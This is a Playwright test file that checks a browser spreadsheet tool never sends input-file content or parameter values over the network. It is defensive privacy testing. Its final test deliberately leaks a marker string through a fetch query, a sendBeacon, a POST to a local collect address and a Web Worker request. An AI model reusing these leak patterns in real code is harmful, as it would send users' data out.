import { mkdirSync, writeFileSync } from 'node:fs';
import path from 'node:path';
import { expect, test } from '@playwright/test';
import * as XLSX from 'xlsx';
import { auditRequests } from '../scripts/lib/request-audit';
import { readWorkbook } from '../scripts/lib/compare-workbooks';
import { allowedCodeUrls, runDataset, watchRequests, type DatasetConfig } from './helpers';

// CLAUDE.md: input file content never leaves the browser. A run may load the static assets of the app and nothing
// else, and no request may carry a piece of the files. The files below hold marker texts that no request may contain.
const ORIGIN = 'http://localhost:4176';
// T7.2: fonts are served by the app (@fontsource); a request to a font or script host fails a run.
const FONT_HOSTS = /fonts\.(googleapis|gstatic)\.com|use\.typekit\.net|fontawesome|bunny\.net/i;
const MARKERS = ['PRIVATE-MARKER-Nguyen Thi Hoa 9f3a', 'Second PRIVATE-MARKER value ü & more'];

const flowFor = (sheet: boolean) => ({
  schemaVersion: 1,
  nodes: [
    { id: 'in', type: 'input_file', settings: sheet ? { key: 'Data', sheet: 'Data' } : { key: 'Data' } },
    { id: 'out', type: 'output', settings: { file: 'Result', sheet: 'Data' } },
  ],
  edges: [{ source: 'in', target: 'out' }],
});

function dataset(dir: string, file: string): DatasetConfig {
  return { name: 'privacy', dir, effectiveDate: '2026-09-30', inputs: { Data: file }, expectedFile: '' };
}

async function outputText(bytes: Uint8Array): Promise<string> {
  const wb = readWorkbook(bytes);
  return JSON.stringify(XLSX.utils.sheet_to_json(wb.Sheets.Data!, { header: 1 }));
}

test('a run of an xlsx file loads only static assets and sends no file content', async ({ page }, info) => {
  const dir = info.outputPath('xlsx');
  const wb = XLSX.utils.book_new();
  XLSX.utils.book_append_sheet(wb, XLSX.utils.aoa_to_sheet([['Id', 'Name'], ['1', MARKERS[0]], ['2', MARKERS[1]]]), 'Data');
  mkdirSync(dir, { recursive: true });
  writeFileSync(path.join(dir, 'data.xlsx'), XLSX.write(wb, { type: 'buffer', bookType: 'xlsx' }));

  const requests = watchRequests(page);
  const ran = await runDataset(page, flowFor(true), dataset(dir, 'data.xlsx'));
  // The markers did go through the engine: they are in the output file.
  const text = await outputText(ran.files[0]!.bytes);
  for (const m of MARKERS) expect(text).toContain(JSON.stringify(m).slice(1, -1));
  // The engine worker loads its wasm file while the run starts (from the app, or from jsDelivr in the Pages build). If
  // the log lacks it, the log does not see worker requests.
  expect(requests.some((r) => /\/duckdb-[^/]*\.wasm$/.test(r.url))).toBe(true);
  expect(auditRequests(requests, ORIGIN, MARKERS, allowedCodeUrls())).toEqual([]);
  expect(requests.filter((r) => FONT_HOSTS.test(r.url))).toEqual([]);
});

test('a run of a csv file, which DuckDB reads from the file handle, sends no file content either', async ({ page }, info) => {
  const dir = info.outputPath('csv');
  mkdirSync(dir, { recursive: true });
  writeFileSync(path.join(dir, 'data.csv'), `Id,Name\n1,"${MARKERS[0]}"\n2,"${MARKERS[1]}"\n`);

  const requests = watchRequests(page);
  const ran = await runDataset(page, flowFor(false), dataset(dir, 'data.csv'));
  const text = await outputText(ran.files[0]!.bytes);
  for (const m of MARKERS) expect(text).toContain(JSON.stringify(m).slice(1, -1));
  expect(auditRequests(requests, ORIGIN, MARKERS, allowedCodeUrls())).toEqual([]);
});

// SPEC 11.5: parameter values stay in the browser like file content. The value is a marker that no request may contain.
const PARAM_MARKER = 'PARAM-MARKER-Tran Van Binh 71c2';

test('parameter values are used by the run and appear in no request', async ({ page }, info) => {
  const dir = info.outputPath('params');
  mkdirSync(dir, { recursive: true });
  writeFileSync(path.join(dir, 'data.csv'), 'Id,Name\n1,Ann\n2,Bob\n');
  const flow = {
    schemaVersion: 2,
    parameters: [
      { key: 'who', label: 'Who', type: 'text', required: true },
      { key: 'min_id', label: 'Minimum id', type: 'number', required: true },
    ],
    nodes: [
      { id: 'in', type: 'input_file', settings: { key: 'Data' } },
      { id: 'keep', type: 'filter', settings: { condition: '[Id] >= PARAM("min_id")' } },
      { id: 'tag', type: 'formula_column', settings: { name: 'Tag', expression: '[Name] & " " & PARAM("who")' } },
      { id: 'out', type: 'output', settings: { file: 'Result', sheet: 'Data' } },
    ],
    edges: [
      { source: 'in', target: 'keep' },
      { source: 'keep', target: 'tag' },
      { source: 'tag', target: 'out' },
    ],
  };
  const requests = watchRequests(page);
  const ran = await runDataset(page, flow, { ...dataset(dir, 'data.csv'), parameterValues: { who: PARAM_MARKER, min_id: 2 } });
  const text = await outputText(ran.files[0]!.bytes);
  // The values did go through the engine: the filter used the number and the formula wrote the text.
  expect(text).toContain(`Bob ${PARAM_MARKER}`);
  expect(text).not.toContain('Ann');
  expect(requests.some((r) => /\/duckdb-[^/]*\.wasm$/.test(r.url))).toBe(true);
  expect(auditRequests(requests, ORIGIN, [...MARKERS, PARAM_MARKER], allowedCodeUrls())).toEqual([]);
});

// SPEC 16.1 item 9: the file with a print layout is made in the browser. The ExcelJS file is a static asset that is requested only for
// a layout, and no request carries file content.
test('a run with a print layout loads the ExcelJS file as a static asset and sends no file content; a run without one does not load it', async ({ page }, info) => {
  const dir = info.outputPath('print');
  mkdirSync(dir, { recursive: true });
  writeFileSync(path.join(dir, 'data.csv'), `Id,Name\n1,"${MARKERS[0]}"\n2,"${MARKERS[1]}"\n`);
  const plainRequests = watchRequests(page);
  await runDataset(page, flowFor(false), dataset(dir, 'data.csv'));
  expect(plainRequests.some((r) => /exceljs/i.test(r.url))).toBe(false);

  const flow = flowFor(false);
  (flow as { schemaVersion: number }).schemaVersion = 5;
  (flow.nodes[1]!.settings as Record<string, unknown>).print = { enabled: true, header: [{ text: 'Report {flow}', align: 'center', bold: true, size: 'large' }], signers: [{ title: 'Maker', line: '(Ký)', name: MARKERS[1] }] };
  const requests = watchRequests(page);
  const ran = await runDataset(page, flow, dataset(dir, 'data.csv'));
  const text = await outputText(ran.files[0]!.bytes);
  for (const m of MARKERS) expect(text).toContain(JSON.stringify(m).slice(1, -1));
  expect(requests.some((r) => /\/assets\/exceljs[^/]*\.js$/i.test(r.url))).toBe(true);
  expect(auditRequests(requests, ORIGIN, MARKERS, allowedCodeUrls())).toEqual([]);
});

test('the audit fails when a page leaks: a query, a beacon and another address are all found', async ({ page }) => {
  const requests = watchRequests(page);
  await page.goto('/acceptance/index.html');
  await page.waitForFunction(() => typeof window.runDataset === 'function');
  const beforeLeaks = requests.length;
  expect(auditRequests(requests, ORIGIN, MARKERS, allowedCodeUrls())).toEqual([]); // loading the page alone is clean
  await page.evaluate(async (marker) => {
    await fetch(`/leak?d=${encodeURIComponent(marker)}`).catch(() => undefined);
    navigator.sendBeacon('/beacon', marker);
    await fetch('http://127.0.0.1:9/collect', { method: 'POST', body: marker, mode: 'no-cors' }).catch(() => undefined);
    // The same kind of leak from a Web Worker, where the engine runs. The address is absolute: a blob: base cannot resolve a path.
    const leakUrl = `${location.origin}/leak-from-worker?d=${encodeURIComponent(marker)}`;
    const code = 'self.onmessage = async (e) => { try { await fetch(e.data); } catch { /* the request is what counts */ } self.postMessage("done"); };';
    const worker = new Worker(URL.createObjectURL(new Blob([code], { type: 'text/javascript' })));
    await new Promise((resolve) => {
      worker.onmessage = resolve;
      worker.postMessage(leakUrl);
    });
    worker.terminate();
  }, MARKERS[0]!);
  await page.waitForTimeout(300);

  const violations = auditRequests(requests, ORIGIN, MARKERS, allowedCodeUrls());
  expect(violations.some((v) => /carries file content/.test(v))).toBe(true);
  expect(violations.some((v) => /not a static asset/.test(v))).toBe(true);
  expect(violations.some((v) => /another address/.test(v))).toBe(true);
  expect(violations.some((v) => /POST/.test(v))).toBe(true);
  // The listener sees the requests of a Web Worker too, and the audit finds the one that carries the marker.
  expect(requests.some((r) => r.url.includes('/leak-from-worker'))).toBe(true);
  expect(violations.some((v) => v.includes('/leak-from-worker') && /carries file content/.test(v))).toBe(true);
  // The findings come from the leaks: the requests before them were clean.
  expect(requests.length).toBeGreaterThan(beforeLeaks);
  expect(auditRequests(requests.slice(0, beforeLeaks), ORIGIN, MARKERS, allowedCodeUrls())).toEqual([]);
});
